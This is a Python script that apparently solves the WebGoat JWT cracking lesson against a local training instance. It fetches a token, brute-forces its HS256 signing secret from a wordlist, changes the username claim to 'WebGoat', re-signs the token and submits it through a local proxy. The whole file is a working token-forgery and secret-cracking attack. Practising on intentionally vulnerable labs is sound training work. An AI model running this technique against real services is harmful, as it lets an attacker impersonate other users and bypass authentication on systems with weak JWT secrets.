import jwt
import requests
import json
import logging

def run_script(url, cookie, proxy='127.0.0.1:8081'):
    proxies = {
            'http': f'http://{proxy}',
            'https': f'https://{proxy}'
        }
    headers = {"Cookie": cookie, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "text/html, */*; q=0.01", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "X-Requested-With": "XMLHttpRequest", "Connection": "close", "Referer": "http://127.0.0.1:8080/WebGoat/start.mvc", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "X-PwnFox-Color": "red"}
    response=requests.get('http://127.0.0.1:8080/WebGoat/JWT/secret/gettoken', headers=headers, proxies=proxies)
    token = response.text
    file='A2_Broken_Authentication/JWT_tokens/raft-small-words.txt'
    options = {'verify_exp':False}
    with open(file) as secrets:
        for secret in secrets:
            try:
                decoded_token = jwt.decode(token,secret.rstrip(), algorithms=['HS256'],audience='webgoat.org', options=options)
                decoded_token["username"] = "WebGoat"
                new_token = jwt.encode(decoded_token, secret.rstrip(), algorithm="HS256")
                burp0_headers = {"Cookie": cookie, "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest", "Origin": "http://127.0.0.1:8080", "Connection": "close", "Referer": "http://127.0.0.1:8080/WebGoat/start.mvc", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "X-PwnFox-Color": "red"}
                burp0_data = {"token": new_token}
                response=requests.post(url, headers=burp0_headers, data=burp0_data, proxies=proxies)
                logging.info("[*] Bravo ! Token décodé avec la clé suivante : " + secret.rstrip())
                response_json = json.loads(response.text)
                if 'Congratulations' in response_json["feedback"]:
                    logging.info('[*] Challenge JWT Cracking validé\n')
                break
            except jwt.InvalidTokenError as e:
                ...
            except jwt.ExpiredSignatureError:
                ...
